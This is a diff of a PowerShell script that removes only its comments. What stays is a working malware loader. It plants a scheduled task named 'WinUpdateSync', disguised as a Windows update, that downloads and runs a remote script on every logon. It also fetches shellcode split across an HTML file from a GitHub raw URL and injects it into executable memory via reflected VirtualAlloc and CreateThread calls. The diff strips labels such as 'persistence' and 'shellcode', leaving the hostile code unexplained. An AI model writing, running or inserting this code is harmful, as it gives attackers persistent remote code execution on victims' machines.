@@ -1,8 +1,3 @@
-# ==========================================================
-# 1. PERSISTENCE LAYER: WinUpdateSync Scheduled Task
-# ==========================================================
-# This ensures the script re-runs on every Logon or Network Change
-# Fixed XML Persistence Block
 $inner_task = 'Start-Sleep -s 10; try { $a="https://raw.githubuser"; $b="content.com/gwyn1869/winupdate/main/drop.ps1"; $d=(Invoke-RestMethod ($a+$b)); . ([scriptblock]::Create($d)) } catch {}'; 
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($inner_task); 
 $enc_task = [Convert]::ToBase64String($bytes); 
@@ -13,18 +8,14 @@ $xml | Out-File "$env:TEMP\t.xml" -Encoding Unicode;
 schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSync" /F; 
 Remove-Item "$env:TEMP\t.xml" -Force;
 
-# ==========================================================
-# 2. SETUP & DOWNLOAD
-# ==========================================================
+
 $htmlPath = "$env:TEMP\sys_cache.html"
 $htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"
 
-# Download the stager/payload
+
 Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing
 
-# ==========================================================
-# 3. HELPER FUNCTIONS (API INVOCATIONS)
-# ==========================================================
+
 function Invoke-VirtualAlloc {
     Param ([IntPtr] $lpAddress, [UInt32] $dwSize, [UInt32] $flAllocationType, [UInt32] $flProtect)
     $AsmBuilder = [System.Reflection.Assembly].Assembly.GetTypes() | ? {$_.Name -eq 'AssemblyBuilder' }
@@ -67,9 +58,7 @@ function Invoke-CreateThread {
     $ProxyMethod.Invoke($lpThreadAttributes, $dwStackSize, $lpStartAddress, $lpParameter, $dwCreationFlags, $lpThreadId)
 }
 
-# ==========================================================
-# 4. SHELLCODE REASSEMBLY
-# ==========================================================
+
 $htmlContent = Get-Content $htmlPath -Raw
 $Delim = "dmr"
 $parts = $htmlContent -split $Delim
@@ -80,19 +69,17 @@ if ($byteArray.Length -lt 10) {
     return
 }
 
-# ==========================================================
-# 5. EXECUTION LOGIC (INJECTION)
-# ==========================================================
-# 0x3000 = Commit/Reserve | 0x40 = Execute/Read/Write
+
+
 $ShellcodeAddr = Invoke-VirtualAlloc -lpAddress ([IntPtr]::Zero) -dwSize $byteArray.Length -flAllocationType 0x3000 -flProtect 0x40
 
 if ($ShellcodeAddr -ne [IntPtr]::Zero) {
     [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $ShellcodeAddr, $byteArray.Length)
     
-    # Launch Thread
+
     Invoke-CreateThread -lpThreadAttributes ([IntPtr]::Zero) -dwStackSize 0 -lpStartAddress $ShellcodeAddr -lpParameter ([IntPtr]::Zero) -dwCreationFlags 0 -lpThreadId ([IntPtr]::Zero) | Out-Null
     
-    # Allow execution time
+
     while($true) { Start-Sleep -Seconds 60 }
 }
 
